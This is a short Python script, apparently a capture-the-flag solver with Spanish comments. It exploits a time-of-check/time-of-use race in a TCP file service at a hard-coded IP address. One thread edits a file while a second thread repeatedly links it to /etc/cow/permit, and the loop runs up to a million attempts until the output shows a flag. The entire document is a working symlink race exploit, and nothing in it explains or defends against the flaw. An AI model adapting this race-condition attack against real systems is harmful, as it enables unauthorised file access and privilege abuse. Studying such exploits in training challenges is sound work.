# solve2.py
import socket, time, threading, random, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "209.159.156.142"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8103

def session(cmds, delay=0.0005):
    out = b""
    try:
        s = socket.create_connection((HOST, PORT), timeout=2)
        try: s.recv(4096)
        except: pass
        for c in cmds:
            s.sendall((c+"\n").encode())
            time.sleep(delay)
            try: out += s.recv(8192)
            except: pass
        try: out += s.recv(65535)
        except: pass
        s.close()
    except: pass
    return out.decode(errors="ignore")

def attempt():
    # 1) Asegura archivo normal justo antes de EDIT
    session(["PUT prof", "AAAA"], delay=0.0002)

    hit = [False]; out_buf = [""]

    def editor():
        out = session(["EDIT prof", "OK", "SHOW"], delay=0.0002)
        out_buf[0] = out
        if "FLAG:" in out: hit[0] = True

    def linker():
        # Ajusta a tu usleep(3000) + latencia. Prueba 0.004–0.008s
        time.sleep(random.uniform(0.004, 0.008))
        for _ in range(6):
            session(["LINK prof /etc/cow/permit"], delay=0.0002)
            time.sleep(0.0005)

    te = threading.Thread(target=editor)
    tl = threading.Thread(target=linker)
    te.start(); tl.start(); te.join(); tl.join()
    return hit[0], out_buf[0]

def main():
    for _ in range(1_000_000):
        ok, out = attempt()
        if ok:
            print(out, end="")
            break
        time.sleep(random.uniform(0.0005, 0.003))

if __name__ == "__main__":
    main()
